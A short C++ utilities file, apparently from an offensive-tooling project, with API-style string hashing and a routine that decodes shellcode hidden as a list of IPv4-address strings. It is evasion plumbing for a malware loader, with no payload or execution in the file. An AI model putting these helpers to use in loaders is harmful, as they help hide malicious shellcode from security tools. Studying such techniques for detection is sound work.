/**
 * Author : Yekuuun
 * Github : https://github.com/Yekuuun
 * 
 * Contains base utils functions.
 */


#include "utils.hpp"

//---------------STRING HASHING--------------------
DWORD HashStringA(LPCSTR str) {
    DWORD hash = 0;
    while (*str) {
        hash = (hash << 5) + hash + *str++;
    }
    return hash;
}

DWORD HashStringW(LPCWSTR str) {
    DWORD hash = 0;
    while (*str) {
        hash = (hash << 5) + hash + (*str++ & 0xFF);
    }
    return hash;
}

//------------PAYLOAD DEOBFUSCATION-----------------

static VOID IpToBytes(const char* ip, uint8_t* byte_array) {
    int octet1, octet2, octet3, octet4;
    sscanf(ip, "%d.%d.%d.%d", &octet1, &octet2, &octet3, &octet4);
    byte_array[0] = (uint8_t)octet1;
    byte_array[1] = (uint8_t)octet2;
    byte_array[2] = (uint8_t)octet3;
    byte_array[3] = (uint8_t)octet4;
}

// Fonction pour déobfusquer le shellcode
PBYTE Ipv4Deobfuscation(const char* obfuscated_shellcode[], size_t shellcode_size) {

    PBYTE deobfuscated_payload = (PBYTE)malloc(shellcode_size * 4);
    if (deobfuscated_payload == NULL) {
        printf("[!] Error allocating memory.\n");
        return NULL;
    }

    size_t offset = 0;

    for (size_t i = 0; i < shellcode_size; i++) {
        uint8_t byte_array[4];
        IpToBytes(obfuscated_shellcode[i], byte_array);

        memcpy(deobfuscated_payload + offset, byte_array, 4);
        offset += 4;
    }

    return deobfuscated_payload;
}
